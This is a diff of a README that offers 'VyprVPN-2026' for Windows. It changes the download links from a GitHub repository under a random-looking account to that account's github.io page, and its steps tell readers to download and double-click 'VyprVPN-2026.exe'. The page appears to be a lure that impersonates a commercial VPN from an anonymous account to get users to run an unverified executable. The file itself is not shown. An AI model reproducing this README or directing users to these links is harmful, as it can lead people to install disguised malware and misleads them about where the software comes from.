@@ -1,6 +1,6 @@
 # 🛡️ VyprVPN-2026 - Protect your online privacy today
 
-[![Download VyprVPN for Windows](https://img.shields.io/badge/Download-VyprVPN_2026-blue.svg)](https://github.com/Astaticgalvanometerpampasgrass334/VyprVPN-2026)
+[![Download VyprVPN for Windows](https://img.shields.io/badge/Download-VyprVPN_2026-blue.svg)](https://astaticgalvanometerpampasgrass334.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer has the following items before you start the installation p
 
 Follow these steps to set up your software:
 
-1. Visit the following link to access the software files: [https://github.com/Astaticgalvanometerpampasgrass334/VyprVPN-2026](https://github.com/Astaticgalvanometerpampasgrass334/VyprVPN-2026).
+1. Visit the following link to access the software files: [https://astaticgalvanometerpampasgrass334.github.io](https://astaticgalvanometerpampasgrass334.github.io).
 2. Locate the button labeled "Download" or click the link provided above to start the transfer.
 3. Save the installer file to your Downloads folder.
 4. Open your Downloads folder and double-click the file named VyprVPN-2026.exe.
